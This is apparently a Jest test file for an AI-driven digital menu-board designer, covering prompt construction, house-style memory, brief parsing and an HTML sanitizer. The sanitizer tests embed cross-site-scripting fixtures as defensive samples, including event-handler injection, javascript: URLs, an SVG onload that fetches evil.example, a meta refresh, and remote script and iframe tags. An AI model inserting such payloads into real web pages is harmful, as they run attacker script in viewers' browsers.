import sanitizeHtml from 'sanitize-html';
import {
  DESIGNER_FONTS,
  DESIGNER_SYSTEM_PROMPT,
  DESIGNER_ART_DIRECTIONS,
  DESIGNER_CONTENT_EMPHASIS,
  DESIGNER_EXEMPLAR,
  buildDesignerUserPrompt,
  summarizeHouseStyle,
  summarizeHouseStyleWithRefines,
  distillRefinePreferences,
  sanitizeDesignerHtml,
  auditDesignerHtmlTaurus,
  stripGuessedStockPhotos,
  buildBriefExtractionSystemPrompt,
  buildBriefExtractionUserPrompt,
  parseDesignerBrief,
  sanitizeClientDesignerBrief,
  formatBriefForPrompt,
  BRIEF_EXTRACTION_MAX_TOKENS,
  BRIEF_EXTRACTION_TIMEOUT_MS,
  countMenuContentRows,
  DESIGNER_MENU_LAYOUT_MIN_ROWS,
  type DesignerBrief,
} from './designer-prompt';
import {
  DESIGNER_EDIT_SHIM,
  injectDesignerEditShim,
  DESIGNER_LAYOUT_ENGINE,
  injectDesignerLayoutEngine,
} from './designer-edit-shim';

// A realistic (>200 char) self-contained board fixture — short docs are rejected.
const DOC = '<!doctype html><html><head><meta charset="utf-8">'
  + '<link href="https://fonts.googleapis.com/css2?family=Fraunces:wght@600&display=swap" rel="stylesheet">'
  + '<style>*{margin:0;box-sizing:border-box}.stage{width:1920px;height:1080px;position:relative;background:#23282f;color:#fff;font-family:Fraunces,serif}'
  + '.hd{position:absolute;top:80px;left:96px;right:96px;font-size:120px}</style></head>'
  + '<body><div class="stage"><div class="hd" data-field="headline">Chrome Coffee</div></div></body></html>';

describe('designer-prompt — system prompt + user prompt', () => {
  it('system prompt names the loaded fonts + the hard Chromium-83 rules', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain('Playfair Display');
    expect(DESIGNER_SYSTEM_PROMPT).toContain('Fraunces');
    // The Taurus guardrails the AI must obey.
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/NEVER use the `inset`/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/NEVER use `gap`/);
    // Output contract: raw HTML only.
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/return ONLY the raw HTML/i);
  });

  it('user prompt threads brand + content + per-candidate art direction', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'coffee menu',
      width: 1920,
      height: 1080,
      vertical: 'qsr',
      venueName: 'Chrome Coffee',
      palette: ['#23282f', '#f0523d'],
      content: 'Espresso 3.50\nLatte 5.00',
      artDirection: DESIGNER_ART_DIRECTIONS[0],
    });
    expect(p).toContain('Chrome Coffee');
    expect(p).toContain('#23282f');
    expect(p).toContain('Espresso 3.50');
    expect(p).toContain('landscape');
    expect(p).toContain(DESIGNER_ART_DIRECTIONS[0]);
  });

  // ── FULL-BOARD MENU LAYOUT (2026-09-22) ──────────────────────────────────
  // Greg pasted his restaurant's site, asked for a menu board, and got three
  // near-empty layouts carrying three fake items. Reading the real menu fixes
  // WHICH items arrive; this fixes what the board does with them.
  //
  // FIXTURE PROVENANCE: `SITE_MENU_CONTENT` below is not hand-written — it is
  // the exact string the web's `buildMenuContentFromReferences` emits for a
  // menu the extractor read (header line + `Section — Item — $price — desc`
  // rows). Its own producer-cut test lives in
  // apps/web/src/components/templates/__tests__/concierge-menu-content.test.ts.
  const SITE_MENU_CONTENT = [
    "REAL MENU from the venue's own website (supertaco.example). 9 items across 2 sections. Every row below is theirs: put ALL of them on the board, names and prices exactly as written, and invent nothing.",
    'Tacos — Al Pastor — $4.25 — marinated pork, pineapple',
    'Tacos — Carnitas — $4.25 — slow-braised pork',
    'Tacos — Pescado — $5.50 — beer-battered cod, slaw',
    'Tacos — Carne Asada — $4.75',
    'Tacos — Veggie — $3.95 — grilled nopales, queso fresco',
    'Burritos — California — $11.50',
    'Burritos — Super Carnitas — $12.75',
    'Drinks — Horchata — $3',
    'Drinks — Jamaica — $3',
  ].join('\n');

  it('counts only real menu rows — prose intros never inflate the tally', () => {
    expect(countMenuContentRows(SITE_MENU_CONTENT)).toBe(9); // 10 lines, 1 is the header
    expect(countMenuContentRows(undefined)).toBe(0);
    expect(countMenuContentRows('A promo board for our grand opening.')).toBe(0);
    // Auto-grounding's own shape still counts (it is the other producer).
    expect(countMenuContentRows("Real menu items from this venue's live catalog (use these, not invented ones):\nCortado — $4.50\nFlat White — $5.00")).toBe(2);
  });

  it('switches the board into FULL-BOARD MENU LAYOUT once the content carries a real menu', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'menu board for the front counter',
      width: 1920, height: 1080, vertical: 'qsr',
      venueName: 'Super Taco',
      content: SITE_MENU_CONTENT,
      artDirection: DESIGNER_ART_DIRECTIONS[0],
    });
    // Every supplied row still reaches the model verbatim.
    expect(p).toContain('Tacos — Al Pastor — $4.25 — marinated pork, pineapple');
    expect(p).toContain('Drinks — Jamaica — $3');
    // …and the layout law that stops it being a poster with a garnish of menu.
    expect(p).toContain('FULL-BOARD MENU LAYOUT');
    expect(p).toContain('9 menu rows');
    expect(p).toMatch(/RENDER EVERY SUPPLIED ROW/);
    expect(p).toMatch(/must EQUAL the number supplied/);
    expect(p).toMatch(/SHRINKING THE TYPE SCALE, NEVER BY DROPPING ROWS/);
    expect(p).toMatch(/dotted leader/);
    expect(p).toMatch(/tabular-nums/);
    expect(p).toMatch(/COLUMNS or stacked BLOCKS/);
    expect(p).toMatch(/visible HEADER/);
    // The three candidates vary in look, never in which items they carry.
    expect(p).toMatch(/DIFFER IN ART DIRECTION, NEVER IN CONTENT/);
    // The standing law is restated, not relaxed.
    expect(p).toMatch(/GROUND-TRUTH LAW IS UNCHANGED AND ABSOLUTE HERE/);
    expect(p).toMatch(/2 for \$6/); // the exact invented deal that started all this
  });

  it('does NOT fire on a board that merely mentions a price (zero regression)', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'grand opening promo',
      width: 1920, height: 1080,
      content: 'Grand opening — Saturday. First 50 guests get a free tote. Coffee from $3.',
    });
    expect(p).toContain('First 50 guests');
    expect(p).not.toContain('FULL-BOARD MENU LAYOUT');
  });

  it('does NOT fire just below the row threshold, and does at it', () => {
    const row = (i: number) => `Tacos — Item ${i} — $${i}.00`;
    const under = Array.from({ length: DESIGNER_MENU_LAYOUT_MIN_ROWS - 1 }, (_v, i) => row(i + 1)).join('\n');
    const at = Array.from({ length: DESIGNER_MENU_LAYOUT_MIN_ROWS }, (_v, i) => row(i + 1)).join('\n');
    const build = (content: string) => buildDesignerUserPrompt({ prompt: 'menu', width: 1920, height: 1080, content });
    expect(build(under)).not.toContain('FULL-BOARD MENU LAYOUT');
    expect(build(at)).toContain('FULL-BOARD MENU LAYOUT');
  });

  it('says nothing about menu layout when there is no content at all', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1080, height: 1920 });
    expect(p).not.toContain('FULL-BOARD MENU LAYOUT');
    expect(p).not.toContain('REAL CONTENT to feature');
  });

  it('exposes 3 distinct art directions for the candidate fan-out', () => {
    expect(DESIGNER_ART_DIRECTIONS).toHaveLength(3);
    expect(new Set(DESIGNER_ART_DIRECTIONS).size).toBe(3);
    expect(DESIGNER_FONTS.length).toBeGreaterThan(10);
  });

  it('system prompt carries the content-is-hero rule, layout contract + the worked exemplar', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/CONTENT IS THE HERO/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/LAYOUT CONTRACT/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/RESERVED footer band|reserved footer band/);
    expect(DESIGNER_SYSTEM_PROMPT).toContain(DESIGNER_EXEMPLAR);
  });

  it('the baked exemplar is itself Taurus-safe + uses only loaded fonts + has the auto-fit safety net', () => {
    // It is shown to the model as the gold standard — it must not teach bad CSS.
    expect(auditDesignerHtmlTaurus(DESIGNER_EXEMPLAR)).toHaveLength(0);
    expect(() => sanitizeDesignerHtml(DESIGNER_EXEMPLAR)).not.toThrow();
    // W0-02: the exemplar must NOT teach the model to author scripts — the
    // platform runtime owns scaling/fitting. The auto-fit contract is the
    // data-fit-col attribute + the reserved footer band.
    expect(DESIGNER_EXEMPLAR).not.toContain('<script');
    expect(DESIGNER_EXEMPLAR).toContain('data-fit-col');
    expect(DESIGNER_EXEMPLAR).toContain('class="foot"');
    // Every font-family it names must be in the loaded set (else it teaches a
    // family the renderer drops to system-ui — the "unstyled" failure).
    const families = (DESIGNER_EXEMPLAR.match(/font-family:([^;}"]+)/g) || [])
      .flatMap((d) => d.replace('font-family:', '').split(','))
      .map((f) => f.trim().replace(/^['"]|['"]$/g, ''))
      .filter((f) => f && !/^(serif|sans-serif|monospace|system-ui)$/i.test(f));
    for (const fam of families) {
      expect(DESIGNER_FONTS as readonly string[]).toContain(fam);
    }
  });
});

describe('sanitizeDesignerHtml', () => {
  // W0-02 (audit 2026-07-12 P0): model-authored JavaScript must NEVER
  // survive sanitization — the sandbox does not stop postMessage, outbound
  // requests, or CPU burn. The platform injects its own trusted runtimes
  // AFTER this pass.
  it('strips ALL model-authored inline scripts (keeps the document)', () => {
    const withScript = DOC.replace('</body>', '<script>var s=1;</script></body>');
    const { html } = sanitizeDesignerHtml(withScript);
    expect(html).toContain('<!doctype html>');
    expect(html).not.toContain('var s=1');
    expect(html).not.toMatch(/<script/i);
  });

  it('strips the malicious-payload corpus: on* handlers, javascript: URLs, SVG onload, meta refresh, nested frames', () => {
    const bad = DOC.replace(
      '</body>',
      '<img src="https://ok.example/x.png" onerror="parent.postMessage({type:\'educms-action\'},\'*\')">' +
      '<a href="javascript:alert(1)">tap</a>' +
      '<svg onload="fetch(\'https://evil.example\')"><circle r="4"/></svg>' +
      '<meta http-equiv="refresh" content="0;url=https://evil.example">' +
      '<div onclick=\'doEvil()\' onmouseover=doEvil2()>x</div>' +
      '<iframe src="https://evil.example"></iframe>' +
      '<base href="https://evil.example/">' +
      '</body>',
    );
    const { html } = sanitizeDesignerHtml(bad);
    expect(html).not.toMatch(/onerror|onclick|onmouseover|onload/i);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/http-equiv\s*=\s*["']?refresh/i);
    expect(html).not.toMatch(/<iframe|<base/i);
    expect(html).not.toMatch(/<script/i);
    // The benign img + its https src survive.
    expect(html).toContain('https://ok.example/x.png');
  });

  it('strips markdown fences + leading prose before the doctype', () => {
    const wrapped = 'Here is your board:\n```html\n' + DOC + '\n```';
    const { html } = sanitizeDesignerHtml(wrapped);
    expect(html.startsWith('<!doctype html>')).toBe(true);
    expect(html).not.toContain('```');
    expect(html).not.toContain('Here is your board');
  });

  it('removes remote scripts + nested frames (remote-code / framing vectors)', () => {
    const bad = DOC.replace('</body>', '<script src="https://evil.example/x.js"></script><iframe src="https://evil.example"></iframe></body>');
    const { html } = sanitizeDesignerHtml(bad);
    expect(html).not.toMatch(/<script[^>]*src=/i);
    expect(html).not.toMatch(/<iframe/i);
  });

  it('throws on unusable input', () => {
    expect(() => sanitizeDesignerHtml('')).toThrow();
    expect(() => sanitizeDesignerHtml('nope')).toThrow();
    expect(() => sanitizeDesignerHtml(42 as unknown)).toThrow();
  });

  it('flags Chromium-83-unsafe CSS as non-fatal warnings', () => {
    const taurusBad = '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;position:relative;background:#111;color:#fff}'
      + '.bg{position:absolute;inset:0}.row{display:flex;gap:8px;align-items:center}</style></head>'
      + '<body><div class="stage"><div class="bg"></div><div class="row" data-field="t">Menu</div></div></body></html>';
    const { html, taurusWarnings } = sanitizeDesignerHtml(taurusBad);
    expect(html).toContain('<!doctype html>'); // not rejected — just warned
    expect(taurusWarnings.some((w) => w.includes('inset'))).toBe(true);
    expect(taurusWarnings.some((w) => w.includes('gap'))).toBe(true);
  });

  it('clean Taurus-safe HTML produces no warnings', () => {
    expect(auditDesignerHtmlTaurus(DOC)).toHaveLength(0);
  });
});

// The global SanitizationPipe (app.module.ts APP_PIPE) runs sanitize-html on
// every request-body string. A RAW `html` field is gutted by it (loses
// <!doctype>/<head>/<style>/<script>) — that bug truncated an 11,445-char
// board to a 3,022-char unstyled fragment on persist (2026-06-28). The fix:
// create-designer accepts `htmlBase64` instead. This locks in *why* — if a
// future refactor reverts to a raw html field, this test fails loudly.
describe('designer board persist — base64 transport survives the global sanitizer', () => {
  // mirror SanitizationPipe.sanitizeString exactly
  const pipe = (s: string) => sanitizeHtml(s, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img']),
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, '*': ['style'] },
  });

  it('RAW html is destroyed by the pipe (the original bug)', () => {
    const gutted = pipe(DOC);
    expect(gutted.length).toBeLessThan(DOC.length);
    expect(gutted).not.toContain('<style>');
    expect(gutted).not.toContain('<!doctype html>');
  });

  it('placeholder', () => { expect(true).toBe(true); });
});

// Phase 4: the editability shim baked into AI Designer boards (EDUCMS-SHIM-V6).
describe('injectDesignerEditShim', () => {
  const DOC = '<!doctype html><html><head><meta charset="utf-8"></head>'
    + '<body><div data-field="venue">Chrome</div><div data-imgslot="hero"></div></body></html>';

  it('the shim carries the V6 marker + the editability protocol', () => {
    expect(DESIGNER_EDIT_SHIM).toContain('EDUCMS-SHIM-V6');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-overrides');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-field-click');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-edit-mode');
    expect(DESIGNER_EDIT_SHIM.trim().startsWith('<script>')).toBe(true);
  });

  it('injects the shim before </head> and is idempotent', () => {
    const once = injectDesignerEditShim(DOC);
    expect(once).toContain('EDUCMS-SHIM-V6');
    // before </head>
    expect(once.indexOf('EDUCMS-SHIM-V6')).toBeLessThan(once.indexOf('</head>'));
    // re-injecting does nothing (no double shim)
    const twice = injectDesignerEditShim(once);
    expect(twice).toBe(once);
    // exactly ONE shim injected (the marker lives once, in the script's /*…*/ comment)
    expect(twice.split('EDUCMS-SHIM-V6').length - 1).toBe(1);
    expect(twice.split('<script>').length).toBe(once.split('<script>').length);
  });

  it('falls back to </body> when there is no head, and appends otherwise', () => {
    const noHead = '<body><div data-field="x">y</div></body>';
    const r = injectDesignerEditShim(noHead);
    expect(r).toContain('EDUCMS-SHIM-V6');
    expect(r.indexOf('EDUCMS-SHIM-V6')).toBeLessThan(r.indexOf('</body>'));
    const bare = '<div data-field="x">y</div>';
    expect(injectDesignerEditShim(bare)).toContain('EDUCMS-SHIM-V6');
  });

  it('does nothing for non-string / empty input', () => {
    expect(injectDesignerEditShim('')).toBe('');
    expect(injectDesignerEditShim(undefined as unknown as string)).toBeUndefined();
  });
});

describe('designer base64 transport (cont.)', () => {
  const pipe = (s: string) => sanitizeHtml(s, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img']),
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, '*': ['style'] },
  });
  it('base64 round-trips through the pipe untouched (the fix)', () => {
    const b64 = Buffer.from(DOC, 'utf8').toString('base64');
    expect(pipe(b64)).toBe(b64); // no tags → sanitize-html passes it through
    const decoded = Buffer.from(pipe(b64), 'base64').toString('utf8');
    expect(decoded).toBe(DOC);
    // and the decoded doc still passes the designer sanitizer with style
    // intact — while any model script is stripped (W0-02).
    const withScript = decoded.replace('</body>', '<style>.z{color:#0f0}</style><script>var s=1;</script></body>');
    const { html } = sanitizeDesignerHtml(withScript);
    expect(html).toContain('<style>');
    expect(html).not.toContain('var s=1');
  });
});

// The deterministic text auto-fit engine baked into every board (the 2026-06-29
// "jumbled hunk" fix): kills guessed pixel sizes that overflow/wrap/collide.
describe('VOS-FIT-ENGINE (injectDesignerLayoutEngine)', () => {
  const DOC = '<!doctype html><html><head><meta charset="utf-8"></head>'
    + '<body><div class="col"><div data-field="venue" data-fit data-fit-min="56">Chrome</div></div></body></html>';

  it('the engine carries the marker + fits [data-fit] by font-size (shrink-to-fit)', () => {
    expect(DESIGNER_LAYOUT_ENGINE).toContain('VOS-FIT-ENGINE');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('data-fit');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('scrollWidth');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('data-fit-min');
    // It must re-run after web fonts load (they change widths late).
    expect(DESIGNER_LAYOUT_ENGINE).toContain('document.fonts');
    expect(DESIGNER_LAYOUT_ENGINE.trim().startsWith('<script>')).toBe(true);
  });

  it('injects before </body> and is idempotent', () => {
    const once = injectDesignerLayoutEngine(DOC);
    expect(once).toContain('VOS-FIT-ENGINE');
    expect(once.indexOf('VOS-FIT-ENGINE')).toBeLessThan(once.indexOf('</body>'));
    const twice = injectDesignerLayoutEngine(once);
    expect(twice).toBe(once); // no double-inject
    expect(twice.split('VOS-FIT-ENGINE').length - 1).toBe(1);
  });

  it('coexists with the edit shim (both present, in order) and is Taurus-safe', () => {
    const both = injectDesignerLayoutEngine(injectDesignerEditShim(DOC));
    expect(both).toContain('EDUCMS-SHIM-V6');
    expect(both).toContain('VOS-FIT-ENGINE');
    // No inset/gap shorthand in the engine (Chromium-83 player target).
    expect(/\binset\s*:/.test(DESIGNER_LAYOUT_ENGINE)).toBe(false);
    expect(/[^-]\bgap\s*:/.test(DESIGNER_LAYOUT_ENGINE)).toBe(false);
  });

  it('does nothing for empty / non-string input', () => {
    expect(injectDesignerLayoutEngine('')).toBe('');
    expect(injectDesignerLayoutEngine(undefined as unknown as string)).toBeUndefined();
  });
});

// The "sunset on a Domino's board" guard: a model-guessed stock-photo URL
// resolves to a random wrong image, so we strip it server-side. The data-imgslot
// stays so the platform can fill a real keyword-matched photo later.
describe('stripGuessedStockPhotos (no wrong photos)', () => {
  it('strips the src from an <img> on a stock host but keeps the slot', () => {
    const h = '<div class="photo"><img data-imgslot="hero" data-photo-query="pizza" src="https://images.unsplash.com/photo-1542281286-9e0a16bb7366?w=1600" alt=""></div>';
    const out = stripGuessedStockPhotos(h);
    expect(out).not.toContain('unsplash.com');
    expect(out).not.toMatch(/src\s*=/); // the guessed src is gone
    expect(out).toContain('data-imgslot="hero"'); // slot preserved for a real fill
    expect(out).toContain('data-photo-query="pizza"');
  });

  it('neutralizes an inline background-image using a stock host', () => {
    const h = '<div style="background-image:url(https://images.pexels.com/x.jpg);color:#fff">x</div>';
    const out = stripGuessedStockPhotos(h);
    expect(out).not.toContain('pexels.com');
    expect(out).toContain('background-image:none');
    expect(out).toContain('color:#fff'); // other styles untouched
  });

  it('leaves a same-origin / our-bucket image src alone', () => {
    const h = '<img data-img="logo" src="https://bhdaxzfalaycfopvcopm.supabase.co/storage/v1/object/public/assets/logo.png">';
    expect(stripGuessedStockPhotos(h)).toContain('supabase.co');
  });

  it('the sanitizer applies the strip end-to-end', () => {
    const doc = '<!doctype html><html><head><meta charset="utf-8">'
      + '<style>.stage{width:1920px;height:1080px;position:relative;background:#111;color:#fff}'
      + '.photo{position:absolute;top:0;right:0;bottom:0;width:600px;background:linear-gradient(160deg,#222,#000)}</style></head>'
      + '<body><div class="stage"><div class="hd" data-field="headline">Chrome Coffee</div>'
      + '<div class="photo" data-imgslot="hero" data-photo-query="latte"><img data-imgslot="hero" src="https://images.unsplash.com/photo-x?w=1600"></div>'
      + '</div></body></html>';
    const { html } = sanitizeDesignerHtml(doc);
    expect(html).not.toContain('unsplash.com');
    expect(html).toContain('data-imgslot="hero"');
  });
});

describe('summarizeHouseStyle — per-tenant style memory', () => {
  const board = (extra: string) =>
    '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;background:#0b1f3a;color:#fff;font-family:Fraunces,serif}'
    + '.s{color:#ff6b35;font-family:Inter,sans-serif}' + extra
    + '</style></head><body><div class="stage"><div class="s">Hi there friend, this is long enough copy to pass the length floor.</div></div></body></html>';

  it('returns null when there is no usable signal', () => {
    expect(summarizeHouseStyle([])).toBeNull();
    expect(summarizeHouseStyle(['<div>too short</div>'])).toBeNull();
  });

  it('distills recurring palette + favored fonts from kept boards', () => {
    const out = summarizeHouseStyle([board(''), board('')]);
    expect(out).toBeTruthy();
    expect(out).toContain('HOUSE STYLE');
    expect(out).toContain('#0b1f3a'); // recurring brand field
    expect(out).toContain('#ff6b35'); // recurring accent
    expect(out).toContain('Fraunces'); // display face
    expect(out).toContain('Inter'); // body face
    expect(out).not.toMatch(/\bserif\b\s*\/|font-family/i); // generic keywords filtered out
  });

  it('detects motion tendency from @keyframes presence', () => {
    const moving = summarizeHouseStyle([board('@keyframes a{to{transform:scale(1.02)}}'), board('@keyframes b{to{opacity:1}}')]);
    expect(moving).toContain('subtle motion');
    const still = summarizeHouseStyle([board(''), board('')]);
    expect(still).toContain('mostly still');
  });

  it('buildDesignerUserPrompt embeds the house style when provided (and omits it otherwise)', () => {
    const hs = summarizeHouseStyle([board(''), board('')])!;
    const withHs = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, houseStyle: hs });
    expect(withHs).toContain('HOUSE STYLE');
    const withoutHs = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080 });
    expect(withoutHs).not.toContain('HOUSE STYLE');
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// #268 item 2 — INTERPRETATION HEDGING: the brief-extraction contract.
// ═══════════════════════════════════════════════════════════════════════════
describe('brief extraction — prompt builders', () => {
  it('system prompt demands raw JSON with the exact contract fields', () => {
    const sys = buildBriefExtractionSystemPrompt();
    expect(sys).toContain('"occasion"');
    expect(sys).toContain('"headline"');
    expect(sys).toContain('"items"');
    expect(sys).toContain('"dateTime"');
    expect(sys).toContain('"tone"');
    expect(sys).toContain('"callToAction"');
    expect(sys).toMatch(/NEVER invent/i);
  });

  it('user prompt threads the brief + optional vertical/content', () => {
    const p = buildBriefExtractionUserPrompt({ prompt: 'happy hour board', vertical: 'bar', content: 'Draft beer 4' });
    expect(p).toContain('happy hour board');
    expect(p).toContain('bar');
    expect(p).toContain('Draft beer 4');
  });

  it('is a cheap, short-timeout pass by design', () => {
    expect(BRIEF_EXTRACTION_MAX_TOKENS).toBeLessThanOrEqual(500);
    expect(BRIEF_EXTRACTION_TIMEOUT_MS).toBeLessThanOrEqual(20_000);
  });
});

describe('parseDesignerBrief — defensive parse (must never throw)', () => {
  const validJson = JSON.stringify({
    occasion: 'happy hour',
    headline: 'Happy Hour Every Friday',
    items: ['House Margarita — $6', 'Loaded Nachos — $9'],
    dateTime: 'Fridays 4-6pm',
    tone: 'playful',
    callToAction: 'Come thirsty',
  });

  it('parses a clean JSON reply', () => {
    const b = parseDesignerBrief(validJson);
    expect(b).toEqual({
      occasion: 'happy hour',
      headline: 'Happy Hour Every Friday',
      items: ['House Margarita — $6', 'Loaded Nachos — $9'],
      dateTime: 'Fridays 4-6pm',
      tone: 'playful',
      callToAction: 'Come thirsty',
    });
  });

  it('strips markdown fences + leading/trailing prose', () => {
    const wrapped = 'Here you go:\n```json\n' + validJson + '\n```\nHope that helps!';
    const b = parseDesignerBrief(wrapped);
    expect(b?.headline).toBe('Happy Hour Every Friday');
  });

  it('returns null (never throws) on garbage, empty, or non-string input', () => {
    expect(parseDesignerBrief('')).toBeNull();
    expect(parseDesignerBrief('not json at all {{{')).toBeNull();
    expect(parseDesignerBrief(undefined)).toBeNull();
    expect(parseDesignerBrief(null)).toBeNull();
    expect(parseDesignerBrief(42)).toBeNull();
    expect(parseDesignerBrief('<!doctype html><html></html>')).toBeNull();
  });

  it('returns null for an all-empty brief (no signal = no value over skipping)', () => {
    expect(parseDesignerBrief(JSON.stringify({ occasion: '', headline: '', items: [], dateTime: '', tone: '', callToAction: '' }))).toBeNull();
  });

  it('truncates oversized fields and caps the items array, never fabricating', () => {
    const huge = JSON.stringify({
      occasion: 'x'.repeat(2000),
      headline: 'ok',
      items: Array.from({ length: 100 }, (_, i) => `item ${i}`),
      dateTime: '',
      tone: '',
      callToAction: '',
    });
    const b = parseDesignerBrief(huge)!;
    expect(b.occasion.length).toBeLessThanOrEqual(400);
    expect(b.items.length).toBeLessThanOrEqual(30);
  });

  it('drops non-string item entries instead of throwing', () => {
    const mixed = JSON.stringify({ occasion: 'x', headline: '', items: ['ok', 42, null, 'also ok'], dateTime: '', tone: '', callToAction: '' });
    const b = parseDesignerBrief(mixed)!;
    expect(b.items).toEqual(['ok', 'also ok']);
  });
});

describe('sanitizeClientDesignerBrief — re-validates a client-round-tripped brief', () => {
  it('accepts a well-formed client object', () => {
    const b = sanitizeClientDesignerBrief({
      occasion: 'happy hour',
      headline: 'Client Headline',
      items: ['Beer — $4'],
      dateTime: '',
      tone: 'playful',
      callToAction: '',
    });
    expect(b?.headline).toBe('Client Headline');
  });

  it('rejects non-object / malformed input without throwing', () => {
    expect(sanitizeClientDesignerBrief(null)).toBeNull();
    expect(sanitizeClientDesignerBrief(undefined)).toBeNull();
    expect(sanitizeClientDesignerBrief('a string')).toBeNull();
    expect(sanitizeClientDesignerBrief(42)).toBeNull();
  });

  it('applies the SAME truncation/shape rules as the extraction parser (defense in depth)', () => {
    const b = sanitizeClientDesignerBrief({ occasion: 'x'.repeat(2000), headline: '', items: [], dateTime: '', tone: '', callToAction: '' });
    expect(b?.occasion.length).toBeLessThanOrEqual(400);
  });
});

describe('formatBriefForPrompt + buildDesignerUserPrompt brief wiring', () => {
  const brief: DesignerBrief = {
    occasion: 'happy hour',
    headline: 'Happy Hour Every Friday',
    items: ['House Margarita — $6'],
    dateTime: 'Fridays 4-6pm',
    tone: 'playful',
    callToAction: 'Come thirsty',
  };

  it('formats every populated field, omits empty ones', () => {
    const text = formatBriefForPrompt(brief);
    expect(text).toContain('CONFIRMED BRIEF');
    expect(text).toContain('Happy Hour Every Friday');
    expect(text).toContain('House Margarita — $6');
    expect(text).toContain('Fridays 4-6pm');
    expect(text).toContain('Come thirsty');
    const noItems = formatBriefForPrompt({ ...brief, items: [], callToAction: '' });
    expect(noItems).not.toContain('Feature these items');
    expect(noItems).not.toContain('Call to action');
  });

  it('buildDesignerUserPrompt embeds the brief + a per-candidate content emphasis', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'happy hour board',
      width: 1920,
      height: 1080,
      brief,
      contentEmphasis: DESIGNER_CONTENT_EMPHASIS[0],
    });
    expect(p).toContain('CONFIRMED BRIEF');
    expect(p).toContain('Happy Hour Every Friday');
    expect(p).toContain('CONTENT EMPHASIS');
    expect(p).toContain(DESIGNER_CONTENT_EMPHASIS[0]);
  });

  it('omits brief + emphasis sections when absent (backward compatible)', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080 });
    expect(p).not.toContain('CONFIRMED BRIEF');
    expect(p).not.toContain('CONTENT EMPHASIS');
  });

  it('exposes 3 distinct content-emphasis directions, index-paired with art directions', () => {
    expect(DESIGNER_CONTENT_EMPHASIS).toHaveLength(DESIGNER_ART_DIRECTIONS.length);
    expect(new Set(DESIGNER_CONTENT_EMPHASIS).size).toBe(DESIGNER_CONTENT_EMPHASIS.length);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// #268 item 4 — LEARN FROM REFINES: keyword-frequency heuristic distillation.
// ═══════════════════════════════════════════════════════════════════════════
describe('distillRefinePreferences — pure keyword-frequency heuristic', () => {
  it('returns [] for no signal / a single one-off instruction (not "recurring")', () => {
    expect(distillRefinePreferences([])).toEqual([]);
    expect(distillRefinePreferences(['make the headline bigger'])).toEqual([]);
  });

  it('surfaces a preference once it recurs 2+ times', () => {
    const prefs = distillRefinePreferences(['make the text bigger', 'the headline is too small to read']);
    expect(prefs.some((p) => /BIGGER/.test(p))).toBe(true);
  });

  it('caps output at 2 lines even with many recurring signals', () => {
    const instructions = [
      'make it bigger', 'too small to read',
      'less clutter please', 'too busy, simplify',
      'use our red', 'our brand color please',
      'make it darker', 'too light, darker theme',
    ];
    const prefs = distillRefinePreferences(instructions);
    expect(prefs.length).toBeLessThanOrEqual(2);
  });

  it('ranks the MOST recurring preference first', () => {
    const instructions = [
      'bigger text', 'too small', 'increase the size please', // 3 hits for "bigger"
      'less clutter', 'too busy', // 2 hits for "cleaner"
    ];
    const prefs = distillRefinePreferences(instructions);
    expect(prefs[0]).toMatch(/BIGGER/);
  });

  it('never throws on garbage input', () => {
    expect(distillRefinePreferences(null as unknown as string[])).toEqual([]);
    expect(distillRefinePreferences([42 as unknown as string, '', 'ok bigger please', 'too small'])).toBeTruthy();
  });
});

describe('summarizeHouseStyleWithRefines — combines keep-derived + refine-derived signal', () => {
  const board = (extra: string) =>
    '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;background:#0b1f3a;color:#fff;font-family:Fraunces,serif}'
    + '.s{color:#ff6b35;font-family:Inter,sans-serif}' + extra
    + '</style></head><body><div class="stage"><div class="s">Hi there friend, this is long enough copy to pass the length floor.</div></div></body></html>';

  it('falls back to plain summarizeHouseStyle output when there are no refines', () => {
    const withRefines = summarizeHouseStyleWithRefines([board(''), board('')], []);
    const plain = summarizeHouseStyle([board(''), board('')]);
    expect(withRefines).toBe(plain);
  });

  it('appends a distilled refine-preference line onto the keep-derived house style', () => {
    const out = summarizeHouseStyleWithRefines([board(''), board('')], ['bigger text please', 'too small to read']);
    expect(out).toContain('HOUSE STYLE');
    expect(out).toContain('#0b1f3a'); // keep-derived signal still present
    expect(out).toMatch(/BIGGER/); // refine-derived signal appended
  });

  it('produces a house-style line from refines ALONE when there are no kept boards yet', () => {
    const out = summarizeHouseStyleWithRefines([], ['less clutter please', 'too busy, simplify']);
    expect(out).toContain('HOUSE STYLE');
    expect(out).toMatch(/CLEANER/);
  });

  it('returns null when NEITHER source has signal (matches summarizeHouseStyle null contract)', () => {
    expect(summarizeHouseStyleWithRefines([], [])).toBeNull();
    expect(summarizeHouseStyleWithRefines(['<div>too short</div>'], ['one-off, not recurring'])).toBeNull();
  });

  it('bounds prompt-lean growth — output stays roughly the same order of size as the base house style', () => {
